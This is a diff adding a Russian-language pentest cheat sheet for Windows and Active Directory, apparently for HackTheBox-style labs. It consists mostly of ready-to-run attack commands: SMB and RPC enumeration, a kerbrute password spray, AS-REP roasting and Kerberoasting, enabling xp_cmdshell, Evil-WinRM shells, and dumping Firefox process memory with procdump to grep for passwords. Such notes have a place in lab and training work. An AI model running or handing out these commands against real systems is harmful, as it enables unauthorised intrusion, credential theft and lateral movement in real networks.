@@ -1,0 +1,127 @@
+windows
+
+winpeas:
+
+https://github.com/peass-ng/PEASS-ng/releases
+
+.\winPEASx64.exe
+
+1. Разведка и сканирование портов
+
+Сканирование хостов Windows и контроллеров домена (Domain Controller):
+
+Bash
+# Быстрое сканирование основных портов Windows
+sudo nmap -sS -p 88,135,139,389,445,464,593,636,1433,3268,3389,5985,5986 <TARGET_IP> -oN nmap_win.txt
+
+# Полный сбор версий и скриптов по найденным портам
+sudo nmap -sC -sV -p<PORTS> <TARGET_IP> -oN nmap_win_detail.txt
+
+2. Действия по специфичным портам Windows
+
+Порты 139 / 445 (SMB)
+
+SMB — один из ключевых векторов в Windows-сетях.
+
+Анонимный доступ и сбор общих ресурсов (Shares):
+
+Bash
+smbpasswd -r IP -U user Old SMB password: New SMB password
+netexec smb <TARGET_IP> -u '' -p '' --shares
+smbclient -L //<TARGET_IP>/ -N
+enum4linux-ng -A <TARGET_IP> (-u users)
+Проверка парольной политики и пользователей:
+
+Bash
+netexec smb <TARGET_IP> -u 'guest' -p '' --pass-pol
+netexec smb <TARGET_IP> -u '' -p '' --users
+Подключение к шаре и скачивание файлов:
+
+Bash
+smbclient //<TARGET_IP>/<SHARE_NAME> -U "domain/user%password"
+
+Порт 135 (MSRPC / RPC)
+
+Перечисление эндпоинтов и объектов через rpcclient:
+
+Bash
+rpcclient -U "" -N <TARGET_IP>
+# Внутри консоли rpcclient:
+# enumdomusers      — список пользователей
+# enumdomgroups     — список групп
+# querydispinfo     — подробная информация о пользователях
+# queryuser <RID>   — информация по конкретному RID
+Порт 88 (Kerberos / Active Directory)
+Валидация списка пользователей (User Enumeration):
+
+kerbrute password-spray -d intelligence.htb --dc 10.10.10.248 users.txt Newuser2020M спрейим пароль
+
+Bash
+kerbrute userenum -d <DOMAIN.LOCAL> --dc <TARGET_IP> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+Атака AS-REP Roasting (пользователи без проверки pre-authentication):
+
+Bash
+impacket-GetNPUsers <DOMAIN.LOCAL>/ -no-pass -usersfile users.txt -dc-ip <TARGET_IP>
+Атака Kerberoasting (запрос TGS-билетов для SPN-учёток):
+
+Bash
+impacket-GetUserSPNs <DOMAIN.LOCAL>/<USER>:<PASSWORD> -dc-ip <TARGET_IP> -request
+Порты 389 / 636 (LDAP / LDAPS)
+Дамп объекта домена через анонимное/учётное подключение:
+
+Bash
+ldapsearch -x -H ldap://<TARGET_IP> -b "DC=domain,DC=local"
+Автоматизированный сбор данных домена (bloodhound-python):
+
+Bash
+bloodhound-python -u '<USER>' -p '<PASSWORD>' -d <DOMAIN.LOCAL> -dc <DC_HOSTNAME> -c All
+
+Порт 1433 (MSSQL)
+
+Проверка стандартных / найденных учётных записей:
+
+Bash
+netexec mssql <TARGET_IP> -u 'sa' -p 'password'
+Выполнение команд при наличии прав sysadmin (impacket-mssqlclient):
+
+Bash
+impacket-mssqlclient <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -windows-auth
+# Внутри консоли:
+# enable_xp_cmdshell
+# xp_cmdshell whoami
+
+dnspy : https://github.com/dnSpy/dnSpy/releases
+
+Порты 5985 / 5986 (WinRM)
+
+Проверка учетных данных:
+
+Bash
+netexec winrm <TARGET_IP> -u 'user' -p 'password'
+Удалённое подключение к интерактивной консоли (Evil-WinRM):
+
+Bash
+evil-winrm -i <TARGET_IP> -u 'user' -p 'password'
+
+
+		# Команда загрузки внутри Evil-WinRM(evil winrm fayl yuklemek )
+				bash:
+				upload /path/to/procdump.exe C:\Users\Chase\AppData\Local\Temp\procdump.exe
+
+				powershell
+				# Поиск PID процессов
+					Get-Process firefox
+
+				# Дамп памяти конкретного процесса (по PID)
+					.\procdump.exe -ma <PID> file.dmp
+
+				#oxumaq fayli
+					strings file.dmp | grep -i "pass"
+
+
+Порт 3389 (RDP)
+
+Подключение к удалённому рабочему столу:
+
+Bash
+xfreerdp /v:<TARGET_IP> /u:<USER> /p:<PASSWORD> /dynamic-resolution +clipboard
